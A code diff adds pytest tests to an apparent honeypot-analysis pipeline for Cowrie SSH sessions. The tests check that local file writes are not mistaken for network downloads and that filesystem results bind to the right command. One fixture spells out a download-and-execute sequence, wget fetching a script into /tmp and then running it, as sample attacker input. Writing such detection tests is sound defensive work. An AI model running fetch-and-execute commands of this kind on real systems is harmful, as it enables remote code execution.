@@ -40,6 +40,10 @@ from production.reporting.typed_semantic_family_selection import (
     validate_policy_output_trace,
     validate_typed_semantic_family_selection,
 )
+from production.utils.cowrie_transfer import is_cowrie_network_transfer
+from production.correlation.session_evidence_graph import build_session_evidence_graph
+from production.correlation.session_behavior_relationships import _build_command_observations, _bound_fs_operation_result
+from production.reporting.artifacts import write_markdown_report
 
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -216,6 +220,214 @@ def _specialized(report: dict[str, Any]) -> tuple[bool, bool]:
         for item in report["response_guidance_v3"]["advisory_actions"]
     }
     return finding, action
+
+
+def test_local_shell_redirection_is_not_a_network_transfer(tmp_path: Path) -> None:
+    session_id = "local-redirection-not-download"
+    event = _transfer_event(session_id, path="/tmp/demo.sh", url="")
+    event["message"] = "Saved redir contents"
+    payload = _payload(
+        session_id,
+        commands=[("echo demo > /tmp/demo.sh", "unknown", "")],
+        transfer_events=[event],
+    )
+    observed, facts, selection = _typed_inputs(payload)
+    report = _report(payload)
+
+    assert not is_cowrie_network_transfer(event)
+    assert selection["status"] == "abstained"
+    assert not any(fact.get("evidence_type") == "direct_cowrie_transfer_event"
+                   for fact in facts["facts"])
+    assert _specialized(report) == (False, False)
+    assert observed["transfer_event_observations"] == []
+    assert all(item.get("transfer_observed") is not True
+               for item in observed["cowrie_event_evidence"])
+    assert report["hypothesis_sets"] == []
+    assert build_session_evidence_graph(payload)["flags"]["has_file_transfer_event"] is False
+    markdown = Path(write_markdown_report(report, payload, tmp_path)).read_text(encoding="utf-8")
+    assert "successful file-transfer event" not in markdown
+    assert "observed_cowrie_transfer_event" not in markdown
+
+
+@pytest.mark.parametrize("url", ["", "/tmp/demo.sh", "[REDACTED]", "http://", "not a url"])
+def test_download_without_remote_url_fails_closed(url: str) -> None:
+    assert not is_cowrie_network_transfer({
+        "eventid": "cowrie.session.file_download", "url": url,
+        "destfile": "/tmp/demo.sh", "shasum": "a" * 64,
+    })
+
+
+def test_cowrie_network_download_with_url_remains_transfer() -> None:
+    assert is_cowrie_network_transfer(_transfer_event("real-download"))
+
+
+def test_local_redirection_does_not_suppress_unconfirmed_transfer_hypothesis() -> None:
+    session_id = "h2-after-local-redirection"
+    payload = _payload(
+        session_id,
+        commands=[
+            ("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success", ""),
+            ("/tmp/demo.sh", "success", ""),
+        ],
+        transfer_events=[_transfer_event(session_id, path="/tmp/demo.sh", url="")],
+    )
+    report = _report(payload)
+    assert _specialized(report) == (False, False)
+    assert len(report["hypothesis_sets"]) == 1
+    assert len(report["hypothesis_sets"][0]["hypotheses"]) == 2
+
+
+@pytest.mark.parametrize(
+    ("command", "operation", "path"),
+    [
+        ("echo demo > /tmp/demo.sh", "file_write", "/tmp/demo.sh"),
+        ("chmod 700 /tmp/demo.sh", "permission_modify", "/tmp/demo.sh"),
+    ],
+)
+def test_exact_fs_result_upgrades_only_its_input_observation(
+    command: str, operation: str, path: str
+) -> None:
+    session_id = "paired-fs-result"
+    invocation = "a" * 32
+    input_event = _command_event(session_id, command, index=0, outcome="unknown", cwd="/home/test")
+    input_event.update(invocation_id=invocation, cwd_status="confirmed")
+    result_event = {
+        "eventid": "cowrie.fs.operation_result",
+        "schema_version": "cowrie_fs_operation_result.v1",
+        "session": session_id,
+        "invocation_id": invocation,
+        "timestamp": "2026-07-30T03:00:01Z",
+        "operation_type": operation,
+        "path": path,
+        "success": True,
+    }
+    if operation == "file_write":
+        result_event["bytes_written"] = 5
+    policy = resolve_behavior_policy(path_text=str(BEHAVIOR_POLICY))
+    observations = _build_command_observations(
+        {"session_id": session_id, "raw_events": [input_event, result_event]}, policy
+    )
+    assert len(observations) == 1
+    assert observations[0]["command_outcome"] == "cowrie_reported_success"
+    assert observations[0]["outcome_scope"] == "fragment"
+    assert len(observations[0]["source_evidence_refs"]) == 2
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    [
+        {"session": "other-session"},
+        {"invocation_id": "b" * 32},
+        {"path": "/tmp/other.sh"},
+        {"timestamp": "2026-07-30T03:06:00Z"},
+        {"bytes_written": 0},
+        {"success": False},
+    ],
+)
+def test_fs_result_binding_fail_closed(mutation: dict[str, Any]) -> None:
+    session_id = "negative-fs-result"
+    input_event = _command_event(
+        session_id, "echo demo > /tmp/demo.sh", index=0, outcome="unknown", cwd="/home/test"
+    )
+    input_event.update(invocation_id="a" * 32, cwd_status="confirmed")
+    result_event = {
+        "eventid": "cowrie.fs.operation_result",
+        "schema_version": "cowrie_fs_operation_result.v1",
+        "session": session_id,
+        "invocation_id": "a" * 32,
+        "timestamp": "2026-07-30T03:00:01Z",
+        "operation_type": "file_write",
+        "path": "/tmp/demo.sh",
+        "success": True,
+        "bytes_written": 5,
+        **mutation,
+    }
+    policy = resolve_behavior_policy(path_text=str(BEHAVIOR_POLICY))
+    observations = _build_command_observations(
+        {"session_id": session_id, "raw_events": [input_event, result_event]}, policy
+    )
+    assert len(observations) == 1
+    assert observations[0]["command_outcome"] == "outcome_unknown"
+
+
+def test_duplicate_fs_results_do_not_upgrade_input() -> None:
+    session_id = "duplicate-fs-result"
+    input_event = _command_event(
+        session_id, "echo demo > /tmp/demo.sh", index=0, outcome="unknown"
+    )
+    input_event["invocation_id"] = "a" * 32
+    result_event = {
+        "eventid": "cowrie.fs.operation_result",
+        "schema_version": "cowrie_fs_operation_result.v1",
+        "session": session_id,
+        "invocation_id": "a" * 32,
+        "timestamp": "2026-07-30T03:00:01Z",
+        "operation_type": "file_write",
+        "path": "/tmp/demo.sh",
+        "success": True,
+        "bytes_written": 5,
+    }
+    policy = resolve_behavior_policy(path_text=str(BEHAVIOR_POLICY))
+    observations = _build_command_observations(
+        {"session_id": session_id, "raw_events": [input_event, result_event, result_event]}, policy
+    )
+    assert len(observations) == 1
+    assert observations[0]["command_outcome"] == "outcome_unknown"
+
+
+def test_paired_fs_results_enable_bounded_h1_g1_without_extra_commands() -> None:
+    session_id = "paired-h1-g1"
+    payload = _payload(
+        session_id,
+        commands=[
+            ("echo demo > /tmp/demo.sh", "unknown", "/home/test"),
+            ("chmod 700 /tmp/demo.sh", "unknown", "/home/test"),
+        ],
+    )
+    inputs = payload["raw_events"]
+    results = []
+    for index, (event, operation) in enumerate(
+        zip(inputs, ("file_write", "permission_modify"), strict=True)
+    ):
+        invocation = f"{index + 1:032x}"
+        event.update(invocation_id=invocation, cwd_status="confirmed")
+        result = {
+            "eventid": "cowrie.fs.operation_result",
+            "schema_version": "cowrie_fs_operation_result.v1",
+            "session": session_id,
+            "invocation_id": invocation,
+            "timestamp": (
+                datetime(2026, 7, 30, 3, 0, tzinfo=timezone.utc)
+                + timedelta(seconds=index, milliseconds=100)
+            ).isoformat(),
+            "operation_type": operation,
+            "path": "/tmp/demo.sh",
+            "success": True,
+        }
+        if operation == "file_write":
+            result["bytes_written"] = 5
+        results.append(result)
+    payload["raw_events"] = [inputs[0], results[0], inputs[1], results[1]]
+    assert _bound_fs_operation_result(inputs[0], payload["raw_events"], session_id=session_id) is not None
+    assert _bound_fs_operation_result(inputs[1], payload["raw_events"], session_id=session_id) is not None
+    direct_graph = build_session_evidence_graph(payload, behavior_policy_path=str(BEHAVIOR_POLICY))
+    assert all(item["command_outcome"] == "cowrie_reported_success" for item in direct_graph["ordered_command_observations"])
+    observed, _facts, _selection = _typed_inputs(payload)
+    assert len(observed["ordered_command_observations"]) == 2
+    assert all(
+        item["command_outcome"] == "cowrie_reported_success"
+        for item in observed["ordered_command_observations"]
+    )
+    report = _report(payload)
+    assert any(
+        "file write and permission change" in hypothesis.get("statement", "")
+        for group in report["hypothesis_sets"]
+        for hypothesis in group.get("hypotheses", [])
+    )
+    assert any(
+        action.get("action_id", "").startswith("review-observed-file-change_")
+        for action in report["response_guidance_v3"]["advisory_actions"]
+    )
 
 
 @pytest.mark.parametrize(
